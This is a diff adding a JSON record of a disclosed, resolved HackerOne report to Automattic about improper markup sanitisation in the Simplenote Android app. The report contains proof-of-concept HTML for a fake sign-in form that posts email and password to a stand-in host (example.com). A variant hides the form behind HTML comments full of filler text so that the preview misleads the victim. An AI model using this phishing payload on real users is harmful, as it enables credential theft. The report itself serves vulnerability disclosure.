@@ -1,0 +1,123 @@
+{
+  "id": 297547,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTc1NDc=",
+  "url": "https://hackerone.com/reports/297547",
+  "title": "Improper markup sanitisation in Simplenote Android application.",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-13T16:37:48.424Z",
+  "submitted_at": "2017-12-13T16:37:48.424Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "edoverflow",
+    "url": "/edoverflow",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-02-13T19:23:58.321Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-01-14T19:23:43.504Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Description\n\nThe Simplenote Android application (1.5.6) still allows users to embed fully-fledged forms.\n\n```html\nSign in to Simplenote\n<h1 class=\"signin\">Please sign in</h1>\n<br>\n<form action=\"https://example.com/login.php\" id=\"login\" name=\"login\">\n   <fieldset class=\"classic-fieldset\" style=\"border:none;\">\n      <div class=\"input-fields\">\n         <p style=\"margin-right: 10px;\"><label for=\"email\">Email</label><input id=\"email\" name=\"email\" placeholder=\"Email\" required=\"\" style=\"padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;\" type=\"email\"></p>\n         <div id=\"warn\"></div>\n         <p style=\"margin-right: 10px;\"><label for=\"password\">Password</label><input id=\"password\" name=\"password\" placeholder=\"Password\" required=\"\" style=\"padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;\" type=\"password\"></p>\n      </div>\n      <br>\n      <p><input class=\"submit button\" type=\"submit\" value=\"Sign In\"></p>\n      <p><input checked=\"checked\" id=\"check\" name=\"remember\" type=\"checkbox\" value=\"1\"> <label class=\"option\" for=\"remember\">Remember Me</label></p>\n      <p class=\"forgot\"><a href=\"#\">Forgot your password?</a></p>\n   </fieldset>\n</form>\n```\n\n{F246484}\n\nA more convincing proof of concept could consist of hiding the form inside several paragraphs of text which are located in HTML comments. That way the victim is presented with what appears to be a text document in the editor panel and then the paragraphs disappear in the preview window.\n\n```html\nSign in to Simplenote\n\n<!-- Lorem ipsum dolor amet polaroid kogi cloud bread keffiyeh vegan DIY pour-over kombucha helvetica wayfarers. Vinyl retro meh cloud bread dreamcatcher af. Dreamcatcher squid twee, tumeric put a bird on it raclette direct trade. Crucifix leggings gluten-free retro la croix. Selvage beard subway tile hella roof party, everyday carry iceland waistcoat kombucha pug. Meh blog cred poke kogi XOXO PBR&B man bun vexillologist woke craft beer chicharrones keffiyeh.\n\nEveryday carry butcher banh mi YOLO whatever shabby chic wayfarers fingerstache hashtag sartorial cloud bread dreamcatcher farm-to-table fashion axe. Post-ironic sartorial farm-to-table venmo next level franzen narwhal crucifix man braid quinoa. Before they sold out jean shorts squid, chicharrones woke scenester normcore church-key. Roof party skateboard lomo neutra disrupt freegan pop-up flannel post-ironic, semiotics art party glossier tilde. Ramps iPhone skateboard, selvage keffiyeh hammock organic fam literally +1 tote bag. Artisan humblebrag scenester retro, umami meggings gochujang cloud bread bespoke. Edison bulb cred pabst iPhone, vice chambray church-key.\n\nChambray affogato air plant direct trade wolf hot chicken selvage lo-fi franzen next level. Pinterest viral sriracha hell of celiac. Lo-fi knausgaard heirloom aesthetic street art, unicorn prism normcore distillery leggings vice kinfolk neutra twee lyft. Hexagon lo-fi mlkshk, hella wolf health goth viral pinterest.\n\nAsymmetrical shabby chic normcore slow-carb banjo pug hashtag green juice la croix flannel. Four dollar toast 8-bit woke tumblr, YOLO hammock tattooed wolf health goth intelligentsia affogato freegan skateboard mustache. Adaptogen scenester portland health goth austin farm-to-table vexillologist normcore synth twee raw denim microdosing. XOXO paleo swag stumptown adaptogen kinfolk raclette authentic.\n\nShabby chic enamel pin vape, trust fund poutine brunch af jianbing. 8-bit four dollar toast quinoa fixie, lomo farm-to-table woke waistcoat selvage normcore palo santo vegan. Chambray chicharrones swag, kombucha celiac dreamcatcher venmo. Tousled leggings selvage unicorn. Hoodie whatever glossier, mixtape keytar kickstarter vaporware forage pug chicharrones slow-carb. Bushwick keffiyeh 90's vexillologist readymade yr, try-hard pabst prism messenger bag disrupt street art succulents fanny pack 8-bit. -->\n\n<h1 class=\"signin\">Please sign in</h1>\n<br>\n<form action=\"https://example.com/login.php\" id=\"login\" name=\"login\">\n   <fieldset class=\"classic-fieldset\" style=\"border:none;\">\n      <div class=\"input-fields\">\n         <p style=\"margin-right: 10px;\"><label for=\"email\">Email</label><input id=\"email\" name=\"email\" placeholder=\"Email\" required=\"\" style=\"padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;\" type=\"email\"></p>\n         <div id=\"warn\"></div>\n         <p style=\"margin-right: 10px;\"><label for=\"password\">Password</label><input id=\"password\" name=\"password\" placeholder=\"Password\" required=\"\" style=\"padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;\" type=\"password\"></p>\n      </div>\n      <br>\n      <p><input class=\"submit button\" type=\"submit\" value=\"Sign In\"></p>\n      <p><input checked=\"checked\" id=\"check\" name=\"remember\" type=\"checkbox\" value=\"1\"> <label class=\"option\" for=\"remember\">Remember Me</label></p>\n      <p class=\"forgot\"><a href=\"#\">Forgot your password?</a></p>\n   </fieldset>\n</form>\n```\n\nThe form HTML could be replaced with a little bit of JavaScript that dynamically generates the form. This would further increase the likelihood of this attack succeeding.\n\n## Impact\n\nAny user input is sent to an attacker's server when submitted via the form.",
+  "weakness": {
+    "id": 74,
+    "name": "UI Redressing (Clickjacking)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 246484,
+      "file_name": "screenshot_20171213-172400_1024.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/246/484/4eb317caeb3e3e2a85a20f773699daf6d40e1b67/screenshot_20171213-172400_1024.jpg?response-content-disposition=attachment%3B%20filename%3D%22screenshot_20171213-172400_1024.jpg%22%3B%20filename%2A%3DUTF-8%27%27screenshot_20171213-172400_1024.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ732SKX7%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T025201Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDdAhFIxco1FU1%2Bs9sy6ohYN9d3t%2FpnKZ1noRLEca%2F8jQIhAMNgvNKHwnoODdZGaxZUApNhOT6Zg5hWNLc1LFj0DfWpKroFCKP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyb0NSpl5TtCknKGPkqjgULb6%2FMdF%2Bl5Cnrpy1nMbufjLrhSW5RshjFrV0xUVk40%2BLljY8W%2Fnop9qWxB9aiqndcIZk8Fl9h0%2FlLecuEoC8UgbXErY6QY2fz2f0iLmc7G0%2ByuB43jzD7r55RGPFYwwNToQ3cFkocFNgJevoyhvsXuffAaNrAiBlDWkxuttbtSpKXh10QJK2Lc%2FQdnYYH1ShYTZAs5S5NYxG%2FIcvx3iq3ksIQ3M%2FvSqP%2FZ50Q%2F3zjUfCJR3H%2FzaqSR%2FnBG9cF2RxqfqZeQ4xArBTQ1BckUlaf42S%2B3O6z%2B%2F2IR0G083dKc98CHb781J9FiJA2m6I1TTVFogC21IPkQ4M6sgDtYuuPJPxE2FB%2BVx92AJuGfMpYSiHrecvOLTDsAUxpbbTgqomii9spdF7b%2Bt0elzFUr7GPs%2BaL%2FjTpsY67RbslmbcN5nOm1nVjzELSbwvVz4sdRVdI%2FiVQdtqmCJqGGv6%2B4Hbqy9U6W%2Be%2BwW1tR4VvtXe4glDAag6guAOPYwsyl53t%2FehIPMx19rGB9wdj1S8KJchgT1fs%2BIeeHqfnpzkI7fQekkKlC%2Be0xi7ia7i3j332p3pbnG1i6Vu6TPt2QgNLOHyS8werT74NqzBuwxOK2JWE9WxMCXaM97sD1itq4YP7Uqdp7GkvINGEchOVgsFnlT%2FRUY8lv60vJ1UGKcGPdAJrS6XvWFKCHWO9wwliB3Mc3H9zu58c9803%2BiuGgmqxlt%2BOvxv1ajOlA%2FimPCcUDidIqVNjpJEde6xnuwE6qSjg7orysNfdt0Ts9Y7rFjG0%2BzGit4Lqanq6VYXC0zLroFF%2BAKZZaYYTX9Fac8oC4Dpa0YdTiVI%2BLLUrnvrMPRp5XGyUN4fl8n0ZwpfzHal51IYw%2BpLkzAY6sAHLiKe8KvK1bOTZprn2nYmd3Ez8cjijlfHlfzSAavoKV6JArztublpmIOlZzlFhFKxgKl89AOledzjRUlHMQITDAnyQb%2BIEOiLs6M%2F87lVwsINpSzDlsgL3s2kl7FWCekTjhez2x92VmwnLiVqwlFVO0kZhyhAOkqDcMZnqhNIldKN%2Bow6gy9CLoNpMvByuqy%2FsYHlnmcYT6cT9aew49xqnQQCs6RrCHpgvOJOOs9apiQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d95ebe82ead4527a37c99de209ea37e075574acf3ec7fbcebaf7883f76b9b279",
+      "file_size": 68453,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-02-13T19:23:43.626Z",
+  "allow_singular_disclosure_after": -253092498.21604127,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "sp1d3rs",
+    "muon4",
+    "yumi",
+    "bl4de",
+    "003random",
+    "savitar0x01",
+    "mahmoud0x00",
+    "eveeez",
+    "khizer47",
+    "cr4xerbik4sh",
+    "and 6 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
